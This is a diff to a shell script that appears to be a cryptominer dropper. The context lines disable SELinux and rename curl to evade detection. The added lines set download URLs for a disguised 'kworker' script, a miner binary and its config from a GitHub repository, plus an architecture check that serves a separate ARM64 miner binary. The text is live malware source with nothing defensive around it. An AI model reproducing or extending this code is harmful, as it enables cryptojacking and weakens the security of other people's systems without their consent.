@@ -48,14 +48,29 @@ mv /usr/bin/curl /usr/bin/cd1
 setenforce 0
 echo SELINUX=disabled >/etc/selinux/config
 
+
 sh_url="https://github.com/Tszialim/LaunchJava/raw/refs/heads/main/kworker"
-miner_url="https://github.com/Tszialim/LaunchJava/raw/refs/heads/main/javae"
-miner_size="8350992"
 sh_url_backup="https://github.com/Tszialim/LaunchJava/raw/refs/heads/main/kworker" 
 config_url="https://github.com/Tszialim/LaunchJava/raw/refs/heads/main/config.json"
-miner_url_backup="https://github.com/Tszialim/LaunchJava/raw/refs/heads/main/javae"
 chattr_size="8000" 
+miner_url="https://github.com/Tszialim/LaunchJava/raw/refs/heads/main/javae"
+miner_url_backup="https://github.com/Tszialim/LaunchJava/raw/refs/heads/main/javae"
+miner_size="8350992"
 
+ARCH=$(uname -m)
+
+
+case "$ARCH" in
+    aarch64|arm64)
+        miner_url="https://github.com/Tszialim/LaunchJava/raw/refs/heads/main/javaes"
+        miner_url_backup="https://github.com/Tszialim/LaunchJava/raw/refs/heads/main/javaes"
+        miner_size="8083328"
+        echo "Detected architecture: ARM64/aarch64-($ARCH)"
+        ;;
+    *)
+        echo "Warning: Unsupported architecture ($ARCH). Falling back to default download URL."
+        ;;
+esac
 
 sleep 1
 
